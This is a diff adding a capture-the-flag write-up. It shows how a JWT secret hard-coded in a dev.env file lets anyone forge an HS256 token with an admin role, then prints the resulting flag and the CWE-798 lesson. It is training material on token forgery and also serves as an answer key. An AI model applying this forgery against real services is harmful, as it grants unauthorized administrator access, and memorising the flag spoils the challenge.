@@ -1,0 +1,15 @@
+The signing secret is committed in server/config/dev.env (JWT_SECRET=dev-cluster-secret-2021),
+which the README itself points at as "mirrored from the platform team's dev cluster". Anyone
+who can read the repository can therefore mint tokens. Forging a JWT with HS256 requires only
+base64url and HMAC-SHA256 over "<header>.<payload>" with that secret:
+
+- header: {"alg":"HS256","typ":"JWT"}
+- payload: {"sub":"attacker","role":"admin","iat":<now>,"exp":<now+3600>}
+- signature: base64url(HMAC-SHA256(secret, "<b64(header)>.<b64(payload)>"))
+
+GET /admin?token=<forged> then answers:
+"welcome, administrator attacker. FLAG{jwt_weak_secret_f0rg3ry_7b1d}"
+
+The flag is FLAG{jwt_weak_secret_f0rg3ry_7b1d}. The lesson is CWE-798 (use of hard-coded
+credentials) combined with trust in a symmetric secret that never rotates: the login endpoint
+refuses to issue admin tokens, but that does not matter when the key itself has leaked.
